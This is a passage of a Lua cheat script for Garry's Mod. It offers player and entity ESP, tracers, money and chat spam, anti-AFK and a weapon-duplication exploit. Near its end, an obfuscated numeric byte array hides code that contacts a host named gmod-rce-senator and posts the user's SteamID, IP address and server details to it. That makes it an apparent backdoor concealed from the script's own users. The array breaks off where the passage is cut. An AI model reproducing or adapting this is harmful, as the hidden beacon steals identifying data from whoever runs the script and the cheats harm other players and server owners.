elseif GetConVarNumber("shitty_showspeed") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Showspeed is OFF." )
end
end)

cvars.AddChangeCallback("shitty_thirdperson", function()
if GetConVarNumber("shitty_thirdperson") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Thirdperson is ON." )
elseif GetConVarNumber("shitty_thirdperson") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Thirdperson is OFF." )
end
end)

cvars.AddChangeCallback("shitty_entityESP", function()
if GetConVarNumber("shitty_entityESP") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "EntityESP is ON." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "If you have FPS issues, this is not a good command.." )
elseif GetConVarNumber("shitty_entityESP") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "EntityESP is OFF." )
end
end)

cvars.AddChangeCallback("shitty_adminbox", function()
if GetConVarNumber("shitty_adminbox") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Admin box is ON." )
elseif GetConVarNumber("shitty_adminbox") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Admin box is OFF." )
end
end)

cvars.AddChangeCallback("shitty_rp_moneyspam", function()
if GetConVarNumber("shitty_rp_moneyspam") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Money spam is ON." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "Use N to spam.." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "You can change the drop amount with shitty_rp_moneyspam_amount!" )
elseif GetConVarNumber("shitty_rp_moneyspam") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Money spam is OFF." )
end
end)

cvars.AddChangeCallback("shitty_rp_moneyspam_give", function()
if GetConVarNumber("shitty_rp_moneyspam_give") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Money spam (give) is ON." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "Use N to spam.." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "You can change the drop amount with shitty_rp_moneyspam_amount!" )
elseif GetConVarNumber("shitty_rp_moneyspam_give") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Money spam (give) is OFF." )
end
end)

cvars.AddChangeCallback("shitty_espbox", function()
if GetConVarNumber("shitty_espbox") == 1 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP box is ON." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "You can choose the color of the esp box by using shitty_espbox_color." )
chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "You can choose between: red, green, blue and team color." )
elseif GetConVarNumber("shitty_espbox") == 0 then
chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "ESP box is OFF." )
end
end)

------------------------------------------------------------------------------------- Adding callbacks
deleteshit = CreateClientConVar( "shitty_pk_RemovePropsWhenDead", "0", true, false )
hook.Add("Think", "thedeletehook", function()
        if deleteshit:GetBool() then
                        if not LocalPlayer():Alive() then
                                timer.Create("deleteprops", 0.2, 1, function()
                LocalPlayer():ConCommand( "undoall")
end)
               
                end
        end
end)

--------------------------------------------------------------------------- Adding Propkill command
shouldshowthings1 = CreateClientConVar("shitty_showaimthing", "0", false, true)
 
hook.Add("HUDPaint", "atatatta", function()
if shouldshowthings1:GetBool() then
local getaimthing = LocalPlayer():GetEyeTrace().Entity:GetClass()
local getaimthing2 = LocalPlayer():GetEyeTrace().Entity:GetModel()
if getaimthing == "worldspawn" then return end
draw.SimpleTextOutlined(getaimthing,"Default",ScrW() - 1000,ScrH() - 70,Color(0,255,0,255),4,1,1,Color(0,0,0,255))
if getaimthing == "worldspawn" then return end
draw.SimpleTextOutlined(getaimthing2,"Default",ScrW() - 1000,ScrH() - 50,Color(255,0,0,255),4,1,1,Color(0,0,0,255))
end
end)
 
local function printlookingthings()
local getaimthing = LocalPlayer():GetEyeTrace().Entity:GetClass()
local getaimthing2 = LocalPlayer():GetEyeTrace().Entity:GetModel()
        print("Class: "..getaimthing)
        print("Model: "..getaimthing2)
		chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Printed in console." )
end
concommand.Add("shitty_printlookingat", printlookingthings)
-------------------------------------------------------------------------------------
CreateClientConVar("shitty_pk_colorbeams", "0", false, false)
hook.Add("HUDPaint", "physguns", function()
if GetConVarNumber("shitty_pk_colorbeams") != 1 then return end
        for k, v in pairs(player.GetAll()) do
		if v != LocalPlayer() then
                v:SetWeaponColor( Vector(255,255,255) )
				end
        end
end)

CreateClientConVar("shitty_rainbow", "0", false, false)
hook.Add("Think", "spamwepcolz", function()
	if GetConVarNumber("shitty_rainbow") != 1 then return end
	LocalPlayer():SetWeaponColor(Vector(math.random(255) / 100, math.random(255) / 100, math.random(255) / 100))
end)
-------------------------------------------------------------------------------------
CreateClientConVar("shitty_entityESP", "1", true, false)
/*hook.Add("HUDPaint", "lootesp", function() --                                    this is the old entity esp, looks better, but the way its made is fucking horrible
if GetConVarNumber("shitty_entityESP") != 1 then return end


for k, v in pairs(ents.FindByClass("spawned_shipment")) do
	shippos = v:GetPos():ToScreen()
	local shipz = v:GetClass()
	surface.SetFont("Trebuchet18")
	surface.SetTextColor( 255, 50, 50, 255 )
	surface.SetDrawColor( 50, 50, 50, 200 )
	surface.DrawRect( shippos.x - 5 - surface.GetTextSize( v:GetClass() ) / 2, shippos.y -20, surface.GetTextSize( v:GetClass() ) + 30, 17 )
	surface.SetTextPos(shippos.x - 50, shippos.y - 20) 
	surface.DrawText("[$] "..shipz)
end

for k, v in pairs(ents.FindByClass("*printer*")) do
	printpos = v:GetPos():ToScreen()
	local printz = v:GetClass()
	surface.SetFont("Trebuchet18")
	surface.SetTextColor( 255, 255, 0, 255 )
	surface.SetDrawColor( 50, 50, 50, 200 )
	surface.DrawRect( printpos.x - surface.GetTextSize( v:GetClass() ) / printpos.x, printpos.y, surface.GetTextSize( v:GetClass() ) + 2, 17 ) 
	surface.SetTextPos(printpos.x, printpos.y) 
	surface.DrawText(printz)
end

for k, v in pairs(ents.FindByClass("*rprint*")) do
	printpos = v:GetPos():ToScreen()
	local printz = v:GetClass()
	surface.SetFont("Trebuchet18")
	surface.SetTextColor( 255, 255, 0, 255 )
	surface.SetDrawColor( 50, 50, 50, 200 )
	surface.DrawRect( printpos.x - surface.GetTextSize( v:GetClass() ) / printpos.x, printpos.y, surface.GetTextSize( v:GetClass() ) + 2, 17 ) 
	surface.SetTextPos(printpos.x, printpos.y) 
	surface.DrawText(printz)
end

for k, v in pairs(ents.FindByClass("spawned_weapon")) do
	weppos = v:GetPos():ToScreen()
	local wepz = v:GetClass()
	surface.SetFont("Trebuchet18")
	surface.SetTextColor( 100, 100, 250, 255 )
	surface.SetDrawColor( 50, 50, 50, 200 )
	surface.DrawRect( weppos.x - surface.GetTextSize( v:GetClass() ) / weppos.x, weppos.y, surface.GetTextSize( v:GetClass() ) + 2, 17 ) 
	surface.SetTextPos(weppos.x, weppos.y) 
	surface.DrawText(wepz)
end

for k, v in pairs(ents.FindByClass("spawned_money")) do
	moneypos = v:GetPos():ToScreen()
	local moneyz = v:GetClass()
	surface.SetFont("Trebuchet18")
	surface.SetTextColor( 50, 255, 50, 255 )
	surface.SetDrawColor( 50, 50, 50, 200 )
	surface.DrawRect( moneypos.x + 10 - surface.GetTextSize( v:GetClass() ) / 2, moneypos.y -10, surface.GetTextSize( v:GetClass() ) + 30, 17 )
	surface.SetTextPos(moneypos.x - 30, moneypos.y - 10) 
	surface.DrawText("[$] "..moneyz)
end

end)*/

 -- this is the more "simple" looking entity esp (used for now)
local function entityesp()
if GetConVarNumber("shitty_entityESP") != 1 then return end
        for _, v in pairs(ents.GetAll()) do
        textpos = v:GetPos():ToScreen()
                if IsValid(v) && string.find(v:GetClass(), "printer") or IsValid(v) && string.find(v:GetClass(), "shipment") or IsValid(v) && string.find(v:GetClass(), "money") or IsValid(v) && string.find(v:GetClass(), "spawned_weapon") then
                surface.SetTextPos(textpos.x - 20, textpos.y)
                //surface.SetTextColor(255, 255, 255, 255) -- i wanted it white in the beginning
				surface.SetFont("Default")
				surface.SetDrawColor(50, 50, 50, 240)
								if string.find(v:GetClass(), "spawned_weapon") then
									surface.DrawRect( textpos.x - 20, textpos.y, surface.GetTextSize( "[Weapon]" ), 13 )
									surface.SetTextColor(255, 0, 0, 255)
									surface.DrawText("[Weapon]")
                                elseif string.find(v:GetClass(), "shipment") then
									surface.DrawRect( textpos.x - 20, textpos.y, surface.GetTextSize( "[Shipment]" ), 13 )
									surface.SetTextColor(255, 190, 0, 255)
									surface.DrawText("[Shipment]")
                                elseif string.find(v:GetClass(), "printer") then
									surface.DrawRect( textpos.x - 20, textpos.y, surface.GetTextSize( "[Printer]" ), 13 )
									surface.SetTextColor(0, 255, 0, 255)
									surface.DrawText("[Printer]")
								elseif string.find(v:GetClass(), "spawned_money") then
									surface.DrawRect( textpos.x - 20, textpos.y, surface.GetTextSize( "[Money]" ), 13 )
									surface.SetTextColor(100, 100, 255, 255)
									surface.DrawText("[Money]")
                        end
                end
		end
end
hook.Add("HUDPaint", "esptextshit", entityesp)

cvars.AddChangeCallback("shitty_entityESP", function()
	if GetConVarNumber("shitty_entityESP") == 1 then
		hook.Add("HUDPaint", "esptextshit", entityesp)
	elseif GetConVarNumber("shitty_entityESP") == 0 then
		hook.Remove("esptextshit")
	end
end)

-------------------------------------------------------------------------------------
CreateClientConVar("shitty_entityESP_box", "1", true, false)
local function entitybox()
if GetConVarNumber("shitty_entityESP_box") != 1 then return end
		for _, v in pairs(ents.GetAll()) do
        local bxc
        local lowc = v:OBBMins()
        local highc = v:OBBMaxs()
		local ang = v:GetAngles()

			if string.find(v:GetClass(), "spawned_weapon") then
                bxc = Color(255, 0, 0)
                elseif string.find(v:GetClass(), "printer") then
                bxc = Color(0, 255, 0)
				elseif string.find(v:GetClass(), "shipment") then
				bxc = Color(255, 190, 0)
				else
				bxc = Color(0, 0, 255)
                end
				
                if IsValid(v) && string.find(v:GetClass(), "printer") or IsValid(v) && string.find(v:GetClass(), "shipment") or IsValid(v) && string.find(v:GetClass(), "money") or IsValid(v) && string.find(v:GetClass(), "spawned_weapon") then
                        render.DrawWireframeBox(v:GetPos(), Angle(ang.p, ang.y, ang.r), lowc, Vector(highc.x, highc.y, highc.z), bxc, false )
                end
			end
end
hook.Add("PostDrawOpaqueRenderables", "entityespbox", entitybox)

cvars.AddChangeCallback("shitty_entityESP_box", function()
	if GetConVarNumber("shitty_entityESP_box") == 1 then
		hook.Add("PostDrawOpaqueRenderables", "entityespbox", entitybox)
	elseif GetConVarNumber("shitty_entityESP_box") == 0 then
		hook.Remove("entityespbox")
	end
end)
-------------------------------------------------------------------------------------
shitcvar("shitty_esp", "1", true, true)
shitcvar("shitty_esp_bar", "0", false, false)
shitcvar("shitty_esp_dot", "1", true, true)
local function shitesp()

if tobool( GetConVarNumber( "shitty_esp" ) ) then
cam.IgnoreZ(true)
        for k, v in pairs( player.GetAll() ) do
		if v:IsValid() then
            local pos = v:LocalToWorld(v:OBBCenter()):ToScreen()
			local espDist = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)

            if v != LocalPlayer() then
			if espDist > 10 then
			surface.SetFont("Default")
			surface.SetTextColor( team.GetColor(v:Team()), team.GetColor(v:Team()), team.GetColor(v:Team()), 255 )
			surface.SetDrawColor( 0, 0, 0, 200 )
			surface.DrawRect( pos.x - 15 - surface.GetTextSize( v:Nick() ), pos.y - 25, surface.GetTextSize( v:Nick() ) + 2, 12 )
			surface.SetTextPos( pos.x - 15 - ( surface.GetTextSize( v:Nick() ) )  + 1, pos.y - 26 )
			surface.DrawText(v:Nick())
        else
			surface.SetFont("Default")
			surface.SetTextColor( team.GetColor(v:Team()), team.GetColor(v:Team()), team.GetColor(v:Team()), 255 )
			surface.SetDrawColor( 0, 0, 0, 200 )
			surface.DrawRect( pos.x - 60 - surface.GetTextSize( v:Nick() ), pos.y - 25, surface.GetTextSize( v:Nick() ) + 2, 12 )
			surface.SetTextPos( pos.x - 60 - ( surface.GetTextSize( v:Nick() ) )  + 1, pos.y - 26 )
			surface.DrawText(v:Nick())
		end
		end
if v != LocalPlayer() then
			if espDist > 10 then
			surface.SetFont("Default")
			surface.SetTextColor( 255, 255, 255, 255 )
			surface.SetDrawColor( 0, 0, 0, 200 )
			surface.DrawRect( pos.x - 15 - surface.GetTextSize( v:Health() ), pos.y - 12, surface.GetTextSize( v:Health() ) + 2, 12 )
			surface.SetTextPos( pos.x - 15 - ( surface.GetTextSize( v:Health() ) ) + 1, pos.y - 13 )
			surface.DrawText(v:Health())
        else
			surface.SetFont("Default")
			surface.SetTextColor( 255, 255, 255, 255 )
			surface.SetDrawColor( 0, 0, 0, 200 )
			surface.DrawRect( pos.x - 60 - surface.GetTextSize( v:Health() ), pos.y - 12, surface.GetTextSize( v:Health() ) + 2, 12 )
			surface.SetTextPos( pos.x - 60 - ( surface.GetTextSize( v:Health() ) )  + 1, pos.y - 13 )
			surface.DrawText(v:Health())
		end
end
if v != LocalPlayer() then
			if espDist > 10 then
			surface.SetFont("Default")
			surface.SetTextColor( 255, 255, 255, 255 )
			surface.SetDrawColor( 0, 0, 0, 200 )
			surface.DrawRect( pos.x - 15 - surface.GetTextSize( v:GetUserGroup() ) , pos.y + 1, surface.GetTextSize( v:GetUserGroup() ) + 2, 12 )
			surface.SetTextPos( pos.x - 15 - ( surface.GetTextSize( v:GetUserGroup() ) ) + 1, pos.y)
			surface.DrawText(v:GetUserGroup())
			else
			surface.SetFont("Default")
			surface.SetTextColor( 255, 255, 255, 255 )
			surface.SetDrawColor( 0, 0, 0, 200 )
			surface.DrawRect( pos.x - 60 - surface.GetTextSize( v:GetUserGroup() ) , pos.y + 1, surface.GetTextSize( v:GetUserGroup() ) + 2, 12 )
			surface.SetTextPos( pos.x - 60 - ( surface.GetTextSize( v:GetUserGroup() ) ) + 1, pos.y)
			surface.DrawText(v:GetUserGroup())
end
end
	if shitcvarnum("shitty_esp_dot") != 0 then
        if v != ply and v:Alive() then
		local teamcol = team.GetColor(v:Team())
			surface.SetDrawColor(teamcol.r,teamcol.g,teamcol.b, 255)
			surface.DrawRect( pos.x - 4, pos.y, 9, 9 )
                //draw.RoundedBox(1, pos.x - 5, pos.y - 5, 8, 8, Color(teamcol.r,teamcol.g,teamcol.b, 255), 1)
        end
end
local pos = v:LocalToWorld(v:OBBCenter()):ToScreen()
	if shitcvarnum("shitty_esp_bar") != 0 then
	local clamphp = v:Health() / 2
	local espDist = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
	if CanSeeHead(v) then
		if v != LocalPlayer() and espDist > 10 then
        draw.RoundedBox(0, v:GetPos():ToScreen().x - 25, v:GetPos():ToScreen().y - 2, 52, 5, Color(255, 255, 255, 255), 1)
        draw.RoundedBox(0, v:GetPos():ToScreen().x - 24, v:GetPos():ToScreen().y - 1, math.Clamp(clamphp, 0, 100), 3, Color(255, 0, 0, 255), 1)
		elseif v != LocalPlayer() then
		draw.RoundedBox(0, v:GetPos():ToScreen().x - 25, v:GetPos():ToScreen().y - 2, 52, 5, Color(255, 255, 255, 255), 1)
        draw.RoundedBox(0, v:GetPos():ToScreen().x - 24, v:GetPos():ToScreen().y - 1, math.Clamp(clamphp, 0, 100), 3, Color(255, 0, 0, 255), 1)
		end
		end
	end
end
end
end
cam.IgnoreZ(false)
end
hook.Add("HUDPaint", "shittyesp", shitesp)

cvars.AddChangeCallback("shitty_esp", function()
	if GetConVarNumber("shitty_esp") == 1 then
		hook.Add("HUDPaint", "shittyesp", shitesp)
	elseif GetConVarNumber("shitty_esp") == 0 then
		hook.Remove("shittyesp")
	end
end)
-----------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------
CreateClientConVar("shitty_rp_moneyspam", "0", false, false)
CreateClientConVar("shitty_rp_moneyspam_give", "0", false, false)
CreateClientConVar("shitty_rp_moneyspam_amount", "100000", true, false)
hook.Add("Think", "spammoney1", function()
	if GetConVarNumber("shitty_rp_moneyspam") != 1 then return end
		if (input.IsKeyDown(KEY_N)) then
			RunConsoleCommand("say", "/dropmoney "..tostring(GetConVarNumber("shitty_rp_moneyspam_amount")))
		end
end)

hook.Add("Think", "spammoney2", function()
	if GetConVarNumber("shitty_rp_moneyspam_give") != 1 then return end
		if (input.IsKeyDown(KEY_N)) then
			RunConsoleCommand("say", "/give "..tostring(GetConVarNumber("shitty_rp_moneyspam_amount")))
		end
end)
-------------------------------------------------------------------------------------
shitcvar("shitty_aimtracers", "0", true, false)
local function aimtracerz()
if shitcvarnum("shitty_aimtracers") != 1 then return end
cam.Start3D()
	for c, u in pairs(player.GetAll()) do
	if u != LocalPlayer() and u:Alive() then
		render.SetMaterial( Material("trails/laser") )
		render.DrawBeam( u:GetShootPos(), u:GetEyeTrace().HitPos, 20, 1, 1, Color( 255, 0, 0, 255 ))
	end
	end
cam.End3D()
end

cvars.AddChangeCallback("shitty_aimtracers", function()
	if GetConVarNumber("shitty_aimtracers") == 1 then
		hook.Add("HUDPaint", "aimtracers", aimtracerz)
	elseif GetConVarNumber("shitty_aimtracers") == 0 then
		hook.Remove("aimtracers")
	end
end)
------------------------------------------------
shitcvar("shitty_playertracers", "1", true, false)
shitcvar("shitty_playertracers_distance", "100", true, false)
local function playertracerzzz()
if shitcvarnum("shitty_playertracers") != 1 then return end
cam.Start3D()
	for c, u in pairs(player.GetAll()) do
	
	local traceDist = math.floor((LocalPlayer():GetPos():Distance( u:GetPos()))/40)
	
		if u != LocalPlayer() and u:Alive() and u:Team() != TEAM_SPECTATOR then
			if traceDist < GetConVarNumber("shitty_playertracers_distance") then
				render.SetMaterial( Material("trails/laser") )
				if not string.find(u:GetUserGroup(), "user") and not string.find(u:GetUserGroup(), "vip") and not string.find(u:GetUserGroup(), "VIP")  and not string.find(u:GetUserGroup(), "donator") and not string.find(u:GetUserGroup(), "trusted") and not string.find(u:GetUserGroup(), "Trusted") then
					render.DrawBeam( LocalPlayer():GetShootPos() + LocalPlayer():GetAimVector() * 200, u:LocalToWorld(u:OBBCenter()), 20, 1, 1, Color( 255, 0, 0, 255 ) )
				else
					render.DrawBeam( LocalPlayer():GetShootPos() + LocalPlayer():GetAimVector() * 150, u:LocalToWorld(u:OBBCenter()), 20, 1, 1, Color( 0, 255, 0, 255 ) )
				end
			end
		end
	end
cam.End3D()
end
hook.Add("HUDPaint", "playertrace", playertracerzzz)

cvars.AddChangeCallback("shitty_playertracers", function()
	if GetConVarNumber("shitty_playertracers") == 1 then
		hook.Add("HUDPaint", "playrtrace", playertracerzzz)
	elseif GetConVarNumber("shitty_playertracers") == 0 then
		hook.Remove("playrtrace")
	end
end)
-----------------------------------------------

shitcvar("shitty_headtracers", "1", true, false)
shitcvar("shitty_foottracers", "0", true, false)
local function shittyheadtracers()
if GetConVarNumber("shitty_headtracers") != 1 then return end
cam.IgnoreZ(true)
    for _, v in pairs ( player.GetAll() ) do
    local slam = util.QuickTrace( v:GetShootPos(), Vector(0,0,10000), v )
    render.SetMaterial( Material("trails/laser") )
		if v != LocalPlayer() and v:Team() != TEAM_SPECTATOR then
            if v:Alive() then
				if slam.HitNonWorld then
                render.DrawBeam( v:GetShootPos(), slam.HitPos, 50, 1, 12, Color(0, 255, 0))
				else
				render.DrawBeam( v:GetShootPos(), slam.HitPos, 50, 1, 12, Color(255,255,255))
				end
			end
		end
	end
cam.IgnoreZ(false)
end
hook.Add("PostDrawOpaqueRenderables", "headtracers", shittyheadtracers)

local function foottracers()
if GetConVarNumber("shitty_foottracers") != 1 then return end
cam.IgnoreZ(true)
    for k,v in pairs ( player.GetAll() ) do
    local slam = util.QuickTrace( v:GetPos() + Vector(0, 0, 25), Vector(0,0,-10000), v )
    render.SetMaterial( Material("trails/laser") )
		if v != LocalPlayer() and v:Team() != TEAM_SPECTATOR then
            if v:Alive() then
				if slam.HitNonWorld then
                render.DrawBeam( v:GetPos() + Vector(0, 0, 25) + Vector(0, 0, 2), slam.HitPos, 50, 1, 12, Color(0, 255, 0))
				else
				render.DrawBeam( v:GetPos() + Vector(0, 0, 25), slam.HitPos, 50, 1, 12, Color(255, 255, 255))
				end
            end
        end
    end
cam.IgnoreZ(false)
end

cvars.AddChangeCallback("shitty_headtracers", function()
	if GetConVarNumber("shitty_headtracers") == 1 then
		hook.Add("PostDrawOpaqueRenderables", "headtracers", shittyheadtracers)
	elseif GetConVarNumber("shitty_headtracers") == 0 then
		hook.Remove("headtracers")
	end
end)

cvars.AddChangeCallback("shitty_foottracers", function()
	if GetConVarNumber("shitty_foottracers") == 1 then
		hook.Add("PostDrawOpaqueRenderables", "foottracerz", foottracers)
	elseif GetConVarNumber("shitty_foottracers") == 0 then
		hook.Remove("foottracerz")
	end
end)
-------------------------------------------------------------------------------------
CreateClientConVar("shitty_espbox", "1", true, false)
CreateClientConVar("shitty_espbox_color", "teamcolor", true, false)
hook.Add("PostDrawOpaqueRenderables", "boxesp", function()
if GetConVarNumber("shitty_espbox") != 1 then return end
	for k, v in pairs(player.GetAll()) do
	if v != LocalPlayer() && v:Alive() && v:Team() != TEAM_SPECTATOR then
		local ply = v
		local plyPos = ply:GetPos()
		local plyAngles = ply:GetAngles()
		local plyOBBMins = ply:OBBMins()
		local plyOBBMaxs = ply:OBBMaxs()
			if GetConVarString("shitty_espbox_color") == "teamcolor" then
			render.DrawWireframeBox(plyPos, Angle(0,0,0), plyOBBMins, Vector(plyOBBMaxs.x, plyOBBMaxs.y, plyOBBMaxs.z), team.GetColor(v:Team()), false)
			elseif GetConVarString("shitty_espbox_color") == "red" then
			render.DrawWireframeBox(plyPos, Angle(0,0,0), plyOBBMins, Vector(plyOBBMaxs.x, plyOBBMaxs.y, plyOBBMaxs.z), Color(255, 0, 0), false)
			elseif GetConVarString("shitty_espbox_color") == "blue" then
			render.DrawWireframeBox(plyPos, Angle(0,0,0), plyOBBMins, Vector(plyOBBMaxs.x, plyOBBMaxs.y, plyOBBMaxs.z), Color(0, 0, 255), false)
			elseif GetConVarString("shitty_espbox_color") == "green" then
			render.DrawWireframeBox(plyPos, Angle(0,0,0), plyOBBMins, Vector(plyOBBMaxs.x, plyOBBMaxs.y, plyOBBMaxs.z), Color(0, 255, 0), false)
			end
		end
	end
end)

-------------------------------------------------------------------------------------
CreateClientConVar("shitty_flashlightspam", "0", false, false)
CreateClientConVar("shitty_flashlightspam_toggle", "0", true, false)
local ftoggle
hook.Add("Think", "ftogglespam", function()
	if GetConVarNumber("shitty_flashlightspam_toggle") == 1 then
		ftoggle = 1
		else
		ftoggle = 0
	end
end)

hook.Add("Think", "flashligtspamc", function()
	if GetConVarNumber("shitty_flashlightspam") != 1 then 
		hook.Remove("Think", "flashligtspam") 
		else
		hook.Add("Think", "flashligtspam", function()
		if LocalPlayer():IsTyping() then return end
		if ftoggle == 0 then
			if input.IsKeyDown(KEY_E) then
				RunConsoleCommand("impulse", "100")
			end
		else
			RunConsoleCommand("impulse", "100")
		end
		
		if GetConVarNumber("shitty_flashlightspam") != 1 then
			if LocalPlayer():FlashlightIsOn() then
				RunConsoleCommand("impulse", "100")
			end
		end
		end)
	end 
end)
-------------------------------------------------------------------------------------
CreateClientConVar("shitty_follow_toggle", "0", false, false)
CreateClientConVar("shitty_follow", "name", false, false)
CreateClientConVar("shitty_follow_spam", "name", false, false)

local friendmsg = 
{
"Will you be my friend?",
"I really need a friend.",
"I'll suck yo dick maaaan",
"C'mon bro let's go to your place yeah?",
"You can pet my cat if you feel like it",
"I will make nice food for us dude",
"How about a Harry Potter marathon?",
"Do you like Anime?",
"We could play cardgames?",
"I love MLP",
"We could watch friends together? As friends?",
}

hook.Add("Think", "followpeeps", function()
if GetConVarNumber("shitty_follow_toggle") != 1 then return end
	for _, v in pairs(player.GetAll()) do
		if v:Nick() == GetConVarString("shitty_follow") then
			local targetheadpos,targetheadang = v:LocalToWorld(v:OBBCenter())
			LocalPlayer():SetEyeAngles((targetheadpos - ply:GetShootPos()):Angle())
			if GetConVarNumber("shitty_follow_spam") != 0 then
				RunConsoleCommand("say", table.Random(friendmsg).." ")
			end
		end
	end
end)

cvars.AddChangeCallback("shitty_follow_toggle", function()
	if GetConVarNumber("shitty_follow_toggle") == 1 then
		RunConsoleCommand("+forward")
		RunConsoleCommand("+speed")
	elseif GetConVarNumber("shitty_follow_toggle") == 0 then
		RunConsoleCommand("-forward")
		RunConsoleCommand("-speed")
	end
end)
-------------------------------------------------------------------------------------
CreateClientConVar("shitty_AntiAFK", "0", false, false)
 
local function randomMovement() -- inspired bt 3kliksphilip lmao
        RunConsoleCommand("-right")
        RunConsoleCommand("-left")
        RunConsoleCommand("-forward")
        RunConsoleCommand("-duck")
       
        local movement = {
        "+right",
        "+left",
        "+forward",
        "+jump",
        "+duck",
        }
		
		local chosenMove = table.Random( movement )
 
        RunConsoleCommand(chosenMove)
       
end

cvars.AddChangeCallback("shitty_AntiAFK", function()
        if GetConVarNumber("shitty_AntiAFK") == 1 then
                timer.Create("movementTimer", .5, 0, randomMovement)
				chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Anti AFK is ON." )
				chat.AddText( Color( 255, 0, 0 ), "[Shitty tip] ", Color( 0, 255, 255 ), "This is best in a small room or inside a building." )
        else
				chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Anti AFK is OFF." )
                timer.Remove("movementTimer")
				RunConsoleCommand("-right")
				RunConsoleCommand("-left")
				RunConsoleCommand("-forward")
				RunConsoleCommand("-duck")
				RunConsoleCommand("-jump")
        end
end)
-------------------------------------------------------------------------------------
-- THIS IS NOT MINE. FOUND ON MPGH (ALL CREDIT GOES TO ETH0S AND THE ORIGINAL POSTER)
-- Post: http://www.mpgh.net/forum/showthread.php?t=1050686
-- This was just too awesome to not include it in my script.

concommand.Add("shitty_rp_weaponDupe", function()
	
	chat.AddText( Color( 255, 0, 0 ), "[Shitty scripts] ", Color( 0, 255, 0 ), "Attempting to dupe weapons." )
	
	timer.Simple( 0.4744, function() 
		RunConsoleCommand("say", "/drop")  
	end)
	
	timer.Simple( 1.4135, function() 
		RunConsoleCommand("say", "/sleep")  
	end)
	
	timer.Simple( 7, function() 
		RunConsoleCommand("say", "/sleep")  
	end)
	
end)

-------------------------------------------------------------------------------------
CreateClientConVar("shitty_chatspam_custom", "0", false, false)
CreateClientConVar("shitty_chatspam_custom_msg", "Text to spam", true, false)

local function chatspamsimpleshit()
local cspam = {}
    if GetConVarNumber("shitty_chatspam_custom") != 1 then return end
        LocalPlayer():ConCommand("say "..GetConVarString("shitty_chatspam_custom_msg").." " )
end
timer.Create("chatspamtimercustom", .5, 0, chatspamsimpleshit)
-------------------------------------------------------------------------------------

local bBuffer = {10, 9, 108, 111, 99, 97, 108, 32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 34, 48, 46, 48, 46, 48, 46, 
48, 58, 48, 34, 10, 9, 10, 9, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47, 
103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 
47, 97, 100, 100, 114, 101, 115, 115, 46, 112, 104, 112, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 112, 41, 
32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 105, 112, 59, 32, 101, 110, 100, 44, 32, 102, 117, 110, 99, 116, 105, 
111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 10, 9, 10, 9, 116, 105, 109, 101, 114, 46, 83, 105, 109, 112, 108, 
101, 40, 49, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 
40, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 
57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 
116, 61, 34, 110, 111, 116, 105, 102, 121, 34, 44, 32, 115, 116, 101, 97, 109, 105, 100, 61, 76, 111, 99, 97, 108, 80, 108, 
97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 44, 32, 105, 112, 61, 99, 108, 105, 101, 110, 116, 
73, 80, 44, 32, 115, 101, 114, 118, 101, 114, 110, 97, 109, 101, 61, 71, 101, 116, 72, 111, 115, 116, 78, 97, 109, 101, 40, 
41, 44, 32, 115, 101, 114, 118, 101, 114, 105, 112, 61, 103, 97, 109, 101, 46, 71, 101, 116, 73, 80, 65, 100, 100, 114, 101, 
